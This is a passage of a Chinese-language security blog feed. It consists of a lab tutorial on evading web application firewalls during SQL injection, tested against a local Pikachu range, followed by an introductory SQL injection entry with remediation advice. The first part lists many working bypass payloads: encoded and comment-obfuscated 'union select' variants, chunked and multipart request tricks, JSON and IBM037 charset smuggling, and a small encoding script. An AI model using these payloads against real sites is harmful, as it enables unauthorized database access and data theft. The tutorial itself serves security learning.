class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第二次转码</p><pre class="line-numbers language-none"><code class="language-none">%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>二次编码注入代码分析</strong></p><p><img src="/2021/08/14/60-zhi-day25/image-20210818181006848.png" alt="image-20210818181006848"></p><p><img src="/2021/08/14/60-zhi-day25/image-20210818181146578.png" alt="image-20210818181146578"></p><p>在源码中特可以看到开启了gpc，对特殊字符进行转义，下面的部分使用了urldecode对传入的参数进行url解码</p><p>因为二次编码gpc不会过滤，所以可以绕过gpc字符转义</p><h2 id="多参数拆分绕过"><a href="#多参数拆分绕过" class="headerlink" title="多参数拆分绕过"></a>多参数拆分绕过</h2><p>条件：多个用户可控参数</p><p>多个参数拼接到同一条 SQL 语句中，可以将注入语句分割插入</p><p>例如：</p><p>请求 get 参数</p><p>a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中。</p><p>在程序代码中看到两个可控的参数，但是使用 union select 会被 waf 拦截</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818181609184.png" alt="image-20210818181609184"></p><p>我们可以使用参数拆分绕过waf拦截</p><pre class="line-numbers language-none"><code class="language-none">?id=-1'union/*&amp;username=*/select 1,user(),3,4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818181851133.png" alt="image-20210818181851133"></p><p>两个参数的值可以控，分解 SQL 注入关键字，可以组合一些 SQL 注入语句突破waf 拦截。</p><h2 id="使用生僻函数绕过"><a href="#使用生僻函数绕过" class="headerlink" title="使用生僻函数绕过"></a>使用生僻函数绕过</h2><p>使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数</p><pre class="line-numbers language-none"><code class="language-none">select polygon((select * from (select * from (select @@version) f) x));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h2><pre class="line-numbers language-none"><code class="language-none">如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用此种编码方式。接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF("\r\n")。然后是数据本身，数据结束后，还会有CRLF("\r\n")两个字符。有一些实现中，块大小的十六进制数和 CRLF 之间可以有空格。最后一块的块大小为 0，表明数据发送结束。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。消息最后以 CRLF 结尾。在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。例：HTTP/1.1 200 OKContent-Type: text/plainTransfer-Encoding: chunked23\r\nThis is the data in the first chunk\r\n1A\r\nand this is the second one\r\n3\r\ncon\r\n8\r\nsequence\r\n0\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应用：</p><p>用 burpsuite 抓包提交分析 首先原生包 id=1&amp;submit=1 查询到用户 id 为 1 的值</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818185241490.png" alt="image-20210818185241490"></p><p>使用分块传输 </p><p>首先在 http 头加上 Transfer-Encoding: chunked 表示分块传输传送</p><p>第一行是长度 第二行是字符串 0 表示传输结束 后面跟上两个空格。</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818185709395.png" alt="image-20210818185709395"></p><p>可以看到页面正常</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818185725034.png" alt="image-20210818185725034"></p><p>也可以使用 burpsuite 的插件 chunked-coding-converter 进行编码提交</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818185912100.png" alt="image-20210818185912100"></p><p><img src="/2021/08/14/60-zhi-day25/image-20210818185902179.png" alt="image-20210818185902179"></p><p>；后面的值数随机的，加上可以绕过绕过一些waf</p><h2 id="信任白名单绕过"><a href="#信任白名单绕过" class="headerlink" title="信任白名单绕过"></a>信任白名单绕过</h2><p>有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过。</p><p>白名单通常有目录</p><p>/admin</p><p>/phpmyadmin</p><p>/admin.php</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.163.146/06/vul/sqli/sqli_str.php?a=/admin.php&amp;name=vince&amp;submit=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818190608047.png" alt="image-20210818190608047"></p><pre class="line-numbers language-none"><code class="language-none">http://192.168.163.146/06/vul/sqli/sqli_str.php/phpmyadmin?name=%27%20union%20select%201,user()--+&amp;submit=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818190701104.png" alt="image-20210818190701104"></p><h2 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h2><p>除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。</p><p>例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会进行检测从而绕过 waf 拦截。</p><p>?/1.jpg&amp;name=vince+&amp;submit=1</p><p>?/1.jpg=/1.jpg&amp;name=vince+&amp;submit=1</p><p>?/1.css=/1.css&amp;name=vince+&amp;submit=1</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.163.146/06/vul/sqli/sqli_str.php?/1.jpg&amp;name=vince+&amp;submit=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818190948566.png" alt="image-20210818190948566"></p><h2 id="pipline-绕过注入"><a href="#pipline-绕过注入" class="headerlink" title="pipline 绕过注入"></a>pipline 绕过注入</h2><p>http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止</p><p>用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改 成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉。</p><p>长度可以通过发送到compare来计算</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818192610366.png" alt="image-20210818192610366"></p><p><img src="/2021/08/14/60-zhi-day25/image-20210818192500559.png" alt="image-20210818192500559"></p><p>第一个包参数的字符要加上长度接着提交即可。有些 waf 会匹配第二个包的正属于正常参数，不会对第一个包的参数进行检测，这样就可以绕过一些 waf 拦截。</p><h2 id="利用-multipart-form-data-绕过"><a href="#利用-multipart-form-data-绕过" class="headerlink" title="利用 multipart/form-data 绕过"></a>利用 multipart/form-data 绕过</h2><p>在 http 头里的 Content-Type 提交表单支持三种协议</p><ul><li>application/x-www-form-urlencoded 编码模式 post 提交</li><li>multipart/form-data 文件上传模式</li><li>text/plain 文本模式</li></ul><p>文件头的属性 是传输前对提交的数据进行编码发送到服务器。</p><p>其中 multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p><p>我们写个html测试</p><p>upload.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.163.146/06/vul/sqli/sqli_id.php<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912191623217.png" alt="image-20210912191623217"></p><p>action地址提交到pikachu靶场</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912192148283.png" alt="image-20210912192148283"></p><p>抓包</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912192332989.png" alt="image-20210912192332989"></p><p>Content-Type: multipart/form-data;</p><p>boundary=—————————28566904301101419271642457175</p><p>boundary 这是用来匹配的值，可以随意，但是下面需要与他相同</p><p>Content-Disposition: form-data; name=”id” 这也能作为 post 提交</p><p>所以程序会接收到构造的 SQL 注入语句-1 union select 1,user()</p><p>可直接注入</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912192438783.png" alt="image-20210912192438783"></p><p>也可以写多个参数，如果只检测第一个参数，就绕过了</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912192548514.png" alt="image-20210912192548514"></p><h2 id="order-by-绕过"><a href="#order-by-绕过" class="headerlink" title="order by 绕过"></a>order by 绕过</h2><p>当 order by 被过滤时，无法猜解字段数，此时可以使用 into 变量名进行代替。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token variable">@a</span><span class="token punctuation">,</span><span class="token variable">@b</span><span class="token punctuation">,</span><span class="token variable">@c</span><span class="token punctuation">,</span><span class="token variable">@d</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912192933162.png" alt="image-20210912192933162"></p><h2 id="http-相同参数请求绕过"><a href="#http-相同参数请求绕过" class="headerlink" title="http 相同参数请求绕过"></a>http 相同参数请求绕过</h2><p>waf 在对危险字符进行检测的时候，分别为 post 请求和 get 请求设定了不同的匹配规则。</p><p>请求被拦截，变换请求方式有几率能绕过检测。如果程序中能同时接收get、post 如果 waf 只对 get 进行匹配拦截，没有对 post 进行拦截，就可绕过</p><p>我们写个php测试下</p><p>test.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>抓包修改提交方式</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912193816279.png" alt="image-20210912193816279"></p><p>发现post覆盖了get</p><p>油鞋waf存在GET或POST，优先匹配POST，从而导致被绕过</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912193938817.png" alt="image-20210912193938817"></p><h2 id="application-json-或者-text-xml-绕过"><a href="#application-json-或者-text-xml-绕过" class="headerlink" title="application/json 或者 text/xml 绕过"></a>application/json 或者 text/xml 绕过</h2><p>有些程序是 json 提交参数，程序也是 json 接收再拼接到 SQL 执行</p><p>json 格式通常不会被拦截，所以可以绕过 waf</p><pre class="line-numbers language-none"><code class="language-none">POST /06/vul/sqli/sqli_id.php HTTP/1.1Host: 192.168.0.115User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type:application/jsonContent-Length: 38Origin: http://192.168.0.115Connection: closeReferer: http://192.168.0.115/06/vul/sqli/sqli_id.phpCookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0Upgrade-Insecure-Requests: 1{'id':1 union select 1,2,3,'submit':1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样 text/xml 也不会被拦截</p><h2 id="运行大量字符绕过"><a href="#运行大量字符绕过" class="headerlink" title="运行大量字符绕过"></a>运行大量字符绕过</h2><p>可以使用 select 0xA 运行一些字符从绕突破一些 waf 拦截</p><pre class="line-numbers language-none"><code class="language-none">id=1 and (select 1)=(select0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>post 编码</p><pre class="line-numbers language-none"><code class="language-none">1+and+(select+1)%3d(select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()&amp;submit=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">id=1+and+(select+1)+and+(select+0xA*1000)+/*!union*/+/*!select*/+1,user()--+&amp;submit=%E6%9F%A5%E8%AF%A2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912195156952.png" alt="image-20210912195156952"></p><h2 id="花扩号绕过"><a href="#花扩号绕过" class="headerlink" title="花扩号绕过"></a>花扩号绕过</h2><p>select 1,2 union select{x 1},user()</p><p>花括号 左边是注释的内容 这样可以一些 waf 的拦截</p><pre class="line-numbers language-none"><code class="language-none">select *from users where id=1 union select {xxx 1},{xxx 2},{xxx 3},user();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912195417450.png" alt="image-20210912195417450"></p><h2 id="使用-ALL-或者-DISTINCT-绕过"><a href="#使用-ALL-或者-DISTINCT-绕过" class="headerlink" title="使用 ALL 或者 DISTINCT 绕过"></a>使用 ALL 或者 DISTINCT 绕过</h2><pre class="line-numbers language-none"><code class="language-none">去掉重复值select 1,2 from users where id=1 union DISTINCT select 1,2;select 1,2 from users where id=1 union select DISTINCT 1,2;显示全部select 1,2 from users where id=1 union all select 1,2;select 1,2 from users where id=1 union select all 1,2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>都可执行</p><h2 id="换行混绕绕过"><a href="#换行混绕绕过" class="headerlink" title="换行混绕绕过"></a>换行混绕绕过</h2><p>目前很多 waf 都会对 union select 进行过滤的 因为使用联合查询 这两个关键词是必须的，一般过滤这个两个字符 想用联合查询就很难了。</p><p>可以使用换行 加上一些注释符进行绕过。</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912195823344.png" alt="image-20210912195823344"></p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><blockquote><p>原理:形式：“%”加上 ASCII 码（先将字符转换为两位 ASCII 码，再转为 16 进制），其中加号“+”在 URL 编码中和“%20”表示一样，均为空格。</p><p>当遇到非 ASCII 码表示的字符时，如中文，浏览器或通过编写 URLEncode，根据 UTF-8、GBK 等编码 16 进制形式，进行转换。如“春”的 UTF-8 编码为 E6 98A5，因此其在支持 UTF-8 的情况下，URL 编码为%E6%98%A5。值得注意的是采取不同的中文编码，会有不同的 URL 编码。</p><p>在 URL 传递到后台时，首先 web 容器会自动先对 URL 进行解析。容器解码时，会根据设置（如 jsp 中，会使用 request.setCharacterEncoding(“UTF-8”)），采用UTF-8 或 GBK 等其中一种编码进行解析。这时，程序无需自己再次解码，便可以获取参数（如使用request.getParameter(paramName)）。</p><p>但是，有时从客户端提交的 URL 无法确定是何种编码，如果服务器选择的编码方式不匹配，则会造成中文乱码。为了解决这个问题，便出现了二次 URLEncode的 方 法 。 </p><p>在 客 户 端 对 URL 进 行 两 次 URLEncode ， 这 样 类 似 上 文 提 到的%E6%98%A5 则会编码为%25e6%2598%25a5，为纯 ASCII 码。Web 容器在接到 URL 后，自动解析一次，因为不管容器使用何种编码进行解析，都支持 ASCII 码，不会出错。然后在通过编写程序对容器解析后的参数进行解码，便可正确得到参数。在这里，客户端的第一次编码，以及服务端的第二次解码，均是由程序员自己设定的，是可控的，可知的。</p></blockquote><p>有些 waf 并未对参数进行解码，而后面程序处理业务时会进行解码，因此可以通</p><p>过二次 url 编码绕过。</p><p><img src="/2021/08/14/60-zhi-day25/blog_metary/source/_posts/day26/image-20210912200927910.png" alt="image-20210912200927910"></p><p>出了全部字符编码也可以进行部分字符编码</p><h2 id="HTTP-数据编码绕过"><a href="#HTTP-数据编码绕过" class="headerlink" title="HTTP 数据编码绕过"></a>HTTP 数据编码绕过</h2><p>编码绕过在绕 waf 中也是经常遇到的，通常 waf 只坚持他所识别的编码，比如说它只识别 utf-8 的字符，但是服务器可以识别比 utf-8 更多的编码。</p><p>那么我们只需要将 payload 按照 waf 识别不了但是服务器可以解析识别的编码格式即可绕过。</p><p>比如请求包中我们可以更改Content-Type中的charset的参数值，我们改为ibm037这个协议编码，有些服务器是支持的。payload 改成这个协议格式就行了。</p><pre class="line-numbers language-none"><code class="language-none">未编码id=123&amp;pass=pass%3d1透过 IBM037 编码%89%84=%F1%F2%F3&amp;%97%81%A2%A2=%97%81%A2%A2~%F1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在提交的 http header中</p><p>Content-Type: application/x-www-form-urlencoded; charset=ibm037</p><p>ibm037py脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parses <span class="token operator">=</span> <span class="token string">'id=-1 union select 1,user()-- &amp;submit=1'</span>ens<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ibm037'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ens<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><p>目前不少 waf 都会使用都会对 union select 进行拦截 单个不拦截 一起就进行拦截。</p><p>针对单个关键词绕过</p><p>sel&lt;&gt;ect 程序过滤&lt;&gt;为空 脚本处理</p><p>sele/**/ct 程序过滤/**/为空</p><p>/*!%53eLEct*/ url 编码与内联注释</p><p>se%0blect 使用空格绕过</p><p>sele%ct 使用百分号绕过</p><p>%53eLEct 编码绕过</p><p>大小写</p><p>uNIoN sELecT 1,2</p><p>union all select 1,2</p><p>union DISTINCT select 1,2</p><p>null+UNION+SELECT+1,2</p><p>/*!union*//*!select*/1,2</p><p>union/**/select/**/1,2</p><p>and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()</p><p>/*!50000union*//*!50000select*/1,2</p><p>/*!40000union*//*!40000select*/1,2</p><p>%0aunion%0aselect 1,2</p><p>%250aunion%250aselect 1,2%09union%09select 1,2</p><p>%0caunion%0cselect 1,2</p><p>%0daunion%0dselect 1,2</p><p>%0baunion%0bselect 1,2</p><p>%0d%0aunion%0d%0aselect 1,2</p><p>–+%0d%0aunion–+%0d%0aselect–+%0d%0a1,–+%0d%0a2</p><p>/*!12345union*//*!12345select*/1,2;</p><p>/*中文*/union/*中文*/select/*中文*/1,2;</p><p>/*!union*//*!00000all*//*!00000select*/1,2</p><p>/* </p><p>*/union/* </p><p>*/select/ *</p><p>*/1,2;</p>]]></content>
      
      
      <categories>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql绕过waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2021/08/05/60-zhi-day23/"/>
      <url>/2021/08/05/60-zhi-day23/</url>
      
        <content type="html"><![CDATA[<h1 id="web安全漏洞与利用"><a href="#web安全漏洞与利用" class="headerlink" title="web安全漏洞与利用"></a>web安全漏洞与利用</h1><p>由于之前已经通关sqli-labs，所以这次写sql注入重点写思路、原理、概念，或者说是靶场所覆盖不了的细节方面。</p><span id="more"></span><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>漏洞描述</strong></p><blockquote><p> Web 程序代码中对用户提交的参数未做过滤就直接放到 SQL 语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑。</p><p>黑客可以利用该漏洞执行任意 SQL 语句，如<strong>查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制</strong>等。</p></blockquote><p><strong>测试方法</strong></p><blockquote><p>工具</p><p>在有可控参数的地方用sqlmap检查，或者burp中的sqlmap插件，或者其他sql注入工具</p><p>手工测试</p><p>利用单引号，and 1=1 and 1=2，字符型测试</p></blockquote><p><img src="/2021/08/05/60-zhi-day23/image-20210805134630643.png" alt="image-20210805134630643"></p><p><img src="/2021/08/05/60-zhi-day23/image-20210805134710102.png" alt="image-20210805134710102"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><blockquote><p>代码层最佳防御 sql 漏洞方案：<strong>采用 sql 语句预编译和绑定变量</strong>，是防御sql 注入的最佳方法。</p><ol><li><p>所有的查询语句都使<strong>用数据库提供的参数化查询接口</strong>，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。</p><p>当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注入攻击。</p></li><li><p>对进入数据库的<strong>特殊字符</strong>（ ‘ &lt;&gt;&amp;*; 等）进行<strong>转义处理，或编码转换</strong>。 </p></li><li><p><strong>确认每种数据的类型</strong>，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p></li><li><p><strong>数据长度应该严格规定</strong>，能在一定程度上防止比较长的 SQL 注入语句无法正确执行。</p></li><li><p>网站每个<strong>数据层的编码统一</strong>，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p></li><li><p><strong>严格限制用户的数据库的操作权限</strong>，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p></li><li><p><strong>避免显示 SQL 错误信息</strong>，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p></li></ol></blockquote><h3 id="与mysql相关知识"><a href="#与mysql相关知识" class="headerlink" title="与mysql相关知识"></a>与mysql相关知识</h3><blockquote><p>在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema的库，其中包含了该数据库的所有数据库名、表名、列表，可以通过SQL注入来拿到用户的账号和口令。</p><p>Mysql5.0以下的只能暴力跑表名；5.0 以下是多用户单操作，5.0 以上是多用户多操作。</p></blockquote><blockquote><p>重点是columns 、tables、SCHEMATA这三个表</p><p>SCHEMA_NAME 记录着库的信息</p><p>tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名</p><p>columns 存储该用户创建的所有数据库的库名、标名和字段名。</p></blockquote><p>至于查询方法就不写了，之前的写的很详细</p><h3 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h3><p>SQL注入就是把SQL命令插入到web表单、输入域名、页面请求，最终达到欺骗 服务器执行恶意SQL命令的目的。</p><h3 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h3><blockquote><p>用户可控参数中注入SQL语法，破坏原有SQL结构，在后台SQL服务器上进行解析执行攻击。</p></blockquote><blockquote><p>SQL 注入漏洞的产生需要满足以下两个条件</p><ul><li>参数用户可控：从前端传给后端的参数内容是用户可以控制的</li><li>参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。</li></ul></blockquote><h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><h4 id="按-SQLMap-分类"><a href="#按-SQLMap-分类" class="headerlink" title="按 SQLMap 分类"></a>按 SQLMap 分类</h4><ol><li>UNION query SQL injection（可联合查询注入）</li><li>Stacked queries SQL injection（可多语句查询注入）堆叠查询</li><li>Boolean-based blind SQL injection（布尔型注入）</li><li>Error-based SQL injection（报错型注入）</li><li>Time-based blind SQL injection（基于时间延迟注入）</li></ol><h4 id="按接受请求类型分类"><a href="#按接受请求类型分类" class="headerlink" title="按接受请求类型分类"></a>按接受请求类型分类</h4><ol><li><p><strong>GET</strong> <strong>注入</strong></p><p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要URL 编码</p></li><li><p><strong>POST</strong> <strong>注入</strong></p><p>POST 请求参数是放在请求 body 里的，长度没有限制</p></li><li><p><strong>COOKIE</strong> <strong>注入</strong></p><p>cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p></li></ol><h4 id="按注入数据类型的区分"><a href="#按注入数据类型的区分" class="headerlink" title="按注入数据类型的区分"></a>按注入数据类型的区分</h4><ol><li><p><strong>int</strong> <strong>整型</strong></p><p>select * from users where id=1</p></li><li><p><strong>sting</strong> <strong>字符型</strong></p><p>select * from users where username=’admin’</p></li><li><p><strong>like</strong> <strong>搜索型</strong></p><p>select * from news where title like ‘%标题%’</p></li></ol><h3 id="sql注入常规利用思路"><a href="#sql注入常规利用思路" class="headerlink" title="sql注入常规利用思路"></a>sql注入常规利用思路</h3><ol><li><p>寻找注入点，可以通过 web 扫描工具实现</p></li><li><p>通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。</p></li><li><p>猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）</p><p>还可以获取数据库的 root 账号 密码—思路</p></li><li><p>可以通过获得的用户信息，寻找后台登录。利用后台或了解的进一步信息。</p></li></ol><h3 id="手工注入常规思路"><a href="#手工注入常规思路" class="headerlink" 